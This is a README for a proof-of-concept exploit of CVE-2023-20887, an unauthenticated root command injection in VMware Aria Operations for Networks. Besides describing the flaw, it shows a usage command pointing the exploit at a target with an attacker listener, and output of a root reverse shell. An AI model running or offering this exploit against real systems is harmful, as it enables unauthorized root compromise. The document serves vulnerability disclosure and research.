# CVE-2023-20887
POC for CVE-2023-20887 VMWare Aria Operations for Networks (vRealize Network Insight) unauthenticated RCE

## Technical Analysis
A root cause analysis of the vulnerability can be found on my blog:
https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/

![poc](poc.gif)


## Summary
VMWare Aria Operations for Networks (vRealize Network Insight) is vulnerable to command injection when accepting user input through the Apache Thrift RPC interface. This vulnerability allows a remote unauthenticated attacker to execute arbitrary commands on the underlying operating system as the root user. The RPC interface is protected by a reverse proxy which can be bypassed. VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.
a malicious actor can get remote code execution in the context of 'root' on the appliance.
VMWare 6.x version are vulnerable.



## Usage
```plaintext
python CVE-2023-20887.py --url https://192.168.116.100 --attacker 192.168.116.1:1337
VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
(*) Starting handler
(+) Received connection from 192.168.116.100
(+) pop thy shell! (it's ready)
sudo bash
id
uid=0(root) gid=0(root) groups=0(root)
hostname
vrni-platform-release
```

## Mitigations
Update to the latest version or mitigate by following the instructions within the Progress Advisory
* https://www.vmware.com/security/advisories/VMSA-2023-0012.html

## Follow Us on Twitter for the latest security research:
*  [SinSinology](https://twitter.com/SinSinology)
*  [SummoningTeam](https://twitter.com/SummoningTeam)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

